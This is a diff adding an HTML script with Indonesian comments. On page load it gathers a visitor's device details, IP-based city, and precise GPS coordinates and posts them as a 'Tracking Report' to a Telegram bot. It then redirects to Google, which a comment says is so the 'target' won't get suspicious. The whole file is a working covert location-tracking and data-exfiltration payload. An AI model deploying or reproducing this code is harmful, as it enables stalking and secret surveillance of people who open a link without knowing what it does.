@@ -1,0 +1,64 @@
+<script>
+    async function kirimData() {
+        const TOKEN = "ID_TOKEN_BOT_KAMU"; // GANTI INI
+        const CHAT_ID = "ID_CHAT_TELEGRAM_KAMU"; // GANTI INI
+
+        // 1. Ambil Data Dasar (Baterai, RAM, dll)
+        let batLevel = "N/A", batStatus = "N/A";
+        try {
+            const battery = await navigator.getBattery();
+            batLevel = Math.round(battery.level * 100) + "%";
+            batStatus = battery.charging ? "✅ YA" : "❌ TIDAK";
+        } catch (e) {}
+
+        // 2. Ambil Data IP (Lokasi Kasar)
+        let geo = {};
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            geo = await res.json();
+        } catch (e) {}
+
+        // 3. Ambil Lokasi GPS (Akurasi Tinggi - Minta Izin)
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Susun Pesan Lengkap
+            const teks = `
+╭───── Tracking Report ───── ⦿
+
+🌐 Bahasa: ${navigator.language}
+📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}
+📺 Screen: ${screen.width}x${screen.height}
+💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB
+🧠 CPU: ${navigator.hardwareConcurrency} Cores
+🔋 Battery: ${batLevel} (${batStatus})
+
+📍 LOCATION (GPS ACCURATE)
+📡 IP: ${geo.ip}
+🏙️ Kota: ${geo.city}
+📌 Lat/Lon: ${lat}, ${lon}
+🗺️ Google Maps: ${mapsUrl}
+🏠 Alamat: (Buka link Maps di atas untuk detail jalan)
+
+╰───── Telegram Tracking`;
+
+            // Kirim ke Telegram
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
+            });
+
+            // Langsung buang ke Google biar gak curiga
+            window.location.href = "https://www.google.com";
+
+        }, (err) => {
+            // Jika target menolak "Izinkan Lokasi", kirim data IP saja
+            console.log("Lokasi ditolak, mengirim data IP saja...");
+        });
+    }
+
+    window.onload = kirimData;
+</script>
